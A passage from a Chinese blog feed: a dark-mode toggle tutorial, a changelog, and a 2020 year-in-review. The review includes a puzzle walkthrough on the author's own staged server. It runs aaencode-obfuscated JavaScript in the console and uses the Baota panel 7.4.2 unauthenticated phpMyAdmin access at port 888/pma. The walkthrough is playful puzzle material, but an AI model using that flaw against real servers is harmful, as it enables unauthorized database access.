Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板…）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 